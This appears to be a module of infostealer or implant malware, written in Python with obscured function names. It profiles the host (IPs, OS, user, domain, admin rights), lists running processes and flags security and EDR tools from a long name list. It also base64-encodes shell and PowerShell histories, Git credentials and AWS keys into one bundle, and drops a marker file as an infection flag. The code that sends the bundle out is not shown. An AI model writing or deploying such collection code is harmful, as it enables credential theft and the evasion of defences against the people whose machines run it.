import base64
import os
import platform
import socket
import subprocess
import sys

K3 = (
    "crowdstrike", "csagent", "csfalcon", "carbon", "carbonblack", "cbdefense",
    "sentinel", "sentinelone", "s1-", "cylance", "elastic", "endpoint", "elr",
    "defender", "msmpeng", "mpcmdrun", "securityhealth", "windefend", "nissrv",
    "symantec", "symantec.*endpoint", "sep", "sav", "norton", "mcafee", "mcshield",
    "mcafeeframework", "trend", "micro", "officescan", "sophos", "savservice",
    "kaspersky", "avp", "avast", "avg", "bitdefender", "bdagent", "vsserv",
    "malwarebytes", "mbam", "eset", "ekrn", "egui", "f-secure", "fsav",
    "sysmon", "sysmon64", "wireshark", "dumpcap", "tshark", "processhacker",
    "procmon", "procexp", "autoruns", "pstools", "x64dbg", "ollydbg", "ida",
    "wincfg", "osquery", "falcon", "tanium", "trapx", "cybereason", "cyserver",
    "paloalto", "traps", "cortex", "fireeye", "mandiant", "hx", "helix",
    "qualys", "rapid7", "insight", "vmware", "vmware.*carbon", "deep",
    "threat", "detect", "response", "edr", "avp.", "amsi", "wdniss",
)


def _h0() -> list[str]:
    out = []
    try:
        n = socket.gethostname()
        out.append(socket.gethostbyname(n))
    except Exception:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1)
        s.connect(("8.8.8.8", 53))
        ip = s.getsockname()[0]
        s.close()
        if ip and ip not in out:
            out.append(ip)
    except Exception:
        pass
    return out or ["unknown"]


def _h1() -> str:
    try:
        return socket.gethostname() or "unknown"
    except Exception:
        return "unknown"


def _h2() -> str:
    try:
        return f"{platform.system()} {platform.release()} ({platform.machine()})"
    except Exception:
        return platform.system() or "unknown"


def _h3() -> dict:
    out = {"os": platform.system() or "unknown", "version": "", "build": "", "kernel": ""}
    try:
        if platform.system() == "Windows":
            out["version"] = platform.release() or ""
            out["build"] = platform.version() or ""
            try:
                import winreg
                kp = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
                with winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    kp,
                    0,
                    winreg.KEY_READ,
                ) as key:
                    pn = ""
                    ei = ""
                    for nm in ("ProductName", "DisplayVersion", "ReleaseId", "CurrentBuild", "CurrentBuildNumber", "EditionID"):
                        try:
                            val, _ = winreg.QueryValueEx(key, nm)
                            val = str(val).strip() if val else ""
                            if nm == "ProductName":
                                pn = val
                            elif nm == "EditionID":
                                ei = val
                            elif nm == "DisplayVersion" and val:
                                out["version"] = val
                            elif nm == "ReleaseId" and val and not out["version"]:
                                out["version"] = val
                            elif nm in ("CurrentBuild", "CurrentBuildNumber") and val:
                                out["build"] = val
                        except (OSError, FileNotFoundError):
                            pass
                    if pn:
                        out["os"] = f"{pn}{' ' + ei if ei else ''}"
                    if not out["build"]:
                        out["build"] = platform.version() or ""
            except Exception:
                pass
        else:
            out["kernel"] = platform.release() or ""
            try:
                with open("/etc/os-release", "r", encoding="utf-8", errors="ignore") as f:
                    ct = f.read()
                for ln in ct.splitlines():
                    ln = ln.strip()
                    if ln.startswith("PRETTY_NAME="):
                        out["version"] = ln.split("=", 1)[1].strip().strip('"')
                    elif ln.startswith("NAME="):
                        out["distro"] = ln.split("=", 1)[1].strip().strip('"')
                    elif ln.startswith("VERSION_ID="):
                        out["version_id"] = ln.split("=", 1)[1].strip().strip('"')
            except Exception:
                pass
            if not out["version"] and out.get("distro"):
                out["version"] = f"{out['distro']} {out.get('version_id', '')}".strip()
            if not out["version"]:
                out["version"] = platform.release() or ""
    except Exception:
        pass
    return out


def _h4() -> str:
    for k in ("USER", "USERNAME", "LOGNAME"):
        v = os.environ.get(k)
        if v:
            return v
    try:
        return os.getlogin()
    except Exception:
        pass
    return "unknown"


def _h5() -> str:
    if platform.system() == "Windows":
        for k in ("USERDNSDOMAIN", "LOGONSERVER"):
            v = os.environ.get(k)
            if v:
                return v
        try:
            import ctypes
            buf = ctypes.create_unicode_buffer(256)
            if ctypes.windll.kernel32.GetComputerNameExW(5, buf, ctypes.c_ulong(256)):
                return buf.value or ""
        except Exception:
            pass
        return ""
    try:
        fqdn = socket.getfqdn()
        if fqdn and "." in fqdn and fqdn != _h1():
            return fqdn.split(".", 1)[1]
    except Exception:
        pass
    return ""


def _h6(mc: int = 50000) -> str:
    try:
        if platform.system() == "Windows":
            r = subprocess.run(
                ["tasklist", "/FO", "CSV", "/NH"],
                capture_output=True,
                text=True,
                timeout=15,
            )
            raw = (r.stdout or "").strip()
        else:
            r = subprocess.run(
                ["ps", "-eo", "pid,comm", "--no-headers"],
                capture_output=True,
                text=True,
                timeout=15,
            )
            raw = (r.stdout or "").strip()
        if len(raw) > mc:
            raw = raw[:mc] + "\n... (truncated)"
        return raw or "(none)"
    except Exception as e:
        return f"(error: {e})"


def _h7(rp: str) -> list[str]:
    names = []
    if not rp or rp.startswith("("):
        return names
    if platform.system() == "Windows":
        for ln in rp.splitlines():
            ln = ln.strip()
            if not ln:
                continue
            if ln.startswith('"'):
                end = ln.find('"', 1)
                if end != -1:
                    names.append(ln[1:end].strip())
            else:
                first = ln.split(",")[0].strip().strip('"')
                if first:
                    names.append(first)
    else:
        for ln in rp.splitlines():
            pts = ln.split(None, 1)
            if len(pts) >= 2:
                names.append(pts[1].strip())
            elif len(pts) == 1 and pts[0].isdigit():
                pass
    return names


def _h8(pn: list[str]) -> list[str]:
    seen = set()
    out = []
    lp = [p.lower() for p in K3]
    for nm in pn:
        if not nm:
            continue
        nl = nm.lower()
        for pat in lp:
            if pat in nl:
                if nl not in seen:
                    seen.add(nl)
                    out.append(nm)
                break
    return sorted(out)


def _h9(path: str, ms: int = 102400) -> str | None:
    try:
        if not os.path.isfile(path):
            return None
        with open(path, "rb") as f:
            d = f.read(ms + 1)
        if len(d) > ms:
            d = d[:ms]
        return base64.b64encode(d).decode("ascii")
    except Exception:
        return None


def _ha() -> list[dict]:
    out = []
    home = os.path.expanduser("~")
    for nm in (".bash_history", ".zsh_history", ".sh_history", ".fish_history", ".python_history"):
        path = os.path.join(home, nm)
        ct = _h9(path, 150000)
        if ct:
            out.append({"path": path, "content": ct})
    if platform.system() == "Windows":
        appdata = os.environ.get("APPDATA") or home
        psp = os.path.join(appdata, "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt")
        ct = _h9(psp, 150000)
        if ct:
            out.append({"path": psp, "content": ct})
        local = os.environ.get("LOCALAPPDATA") or home
        ps7 = os.path.join(local, "Microsoft", "PowerShell", "PSReadLine", "ConsoleHost_history.txt")
        if ps7 != psp:
            ct = _h9(ps7, 150000)
            if ct:
                out.append({"path": ps7, "content": ct})
    else:
        psp = os.path.join(home, ".local", "share", "powershell", "PSReadLine", "ConsoleHost_history.txt")
        ct = _h9(psp, 150000)
        if ct:
            out.append({"path": psp, "content": ct})
    return out


def _hb() -> list[dict]:
    out = []
    home = os.path.expanduser("~")
    cand = [
        os.path.join(home, ".git-credentials"),
        os.path.join(home, ".config", "git", "credentials"),
    ]
    if platform.system() == "Windows":
        cand.append(os.path.join(home, "git-credentials"))
    for path in cand:
        ct = _h9(path, 50000)
        if ct:
            out.append({"path": path, "content": ct})
    gcfg = os.path.join(home, ".gitconfig")
    c = _h9(gcfg, 30000)
    if c:
        out.append({"path": gcfg, "content": c})
    return out


def _hc() -> list[dict]:
    out = []
    home = os.path.expanduser("~")
    ad = os.path.join(home, ".aws")
    if not os.path.isdir(ad):
        return out
    for nm in ("credentials", "config"):
        path = os.path.join(ad, nm)
        ct = _h9(path, 50000)
        if ct:
            out.append({"path": path, "content": ct})
    return out


def _hd() -> tuple[bool, str]:
    if platform.system() == "Windows":
        try:
            import ctypes
            if ctypes.windll.shell32.IsUserAnAdmin():
                return True, "admin"
        except Exception:
            pass
        return False, "user"
    try:
        if os.geteuid() == 0:
            return True, "root"
    except Exception:
        pass
    try:
        r = subprocess.run(
            ["sudo", "-n", "true"],
            capture_output=True,
            timeout=5,
        )
        if r.returncode == 0:
            return True, "sudoer"
    except Exception:
        pass
    try:
        with open("/etc/group", "r", encoding="utf-8", errors="ignore") as f:
            mg = set(os.getgroups())
            for ln in f:
                pts = ln.strip().split(":")
                if len(pts) >= 3 and pts[0] in ("sudo", "wheel", "admin"):
                    try:
                        gid = int(pts[2])
                        if gid in mg:
                            return True, "sudoer"
                    except (ValueError, IndexError):
                        pass
    except Exception:
        pass
    return False, "user"


def _he() -> list[str]:
    rp = _h6()
    pn = _h7(rp)
    return _h8(pn)


def _hf() -> dict:
    rp = _h6()
    pn = _h7(rp)
    st = _h8(pn)
    ipr, pl = _hd()
    return {
        "ip": _h0(),
        "hostname": _h1(),
        "os": _h2(),
        "os_detailed": _h3(),
        "username": _h4(),
        "domain": _h5() or None,
        "admin": ipr,
        "privileges": pl,
        "processes": rp,
        "security_tools": st,
        "histories": _ha(),
        "git_credentials": _hb(),
        "aws_keys": _hc(),
    }


def _hg() -> str:
    from .m0 import Kb
    if platform.system() == "Windows":
        b = os.environ.get("APPDATA") or os.path.expanduser("~")
        dp = os.path.join(b, Kb)
    else:
        dp = os.path.join(os.path.expanduser("~"), ".local", "share", Kb)
    os.makedirs(dp, exist_ok=True)
    return os.path.join(dp, ".c")


def _hi() -> bool:
    return os.path.isfile(_hg())


def _hj() -> None:
    try:
        with open(_hg(), "w") as f:
            f.write("1")
    except Exception:
        pass
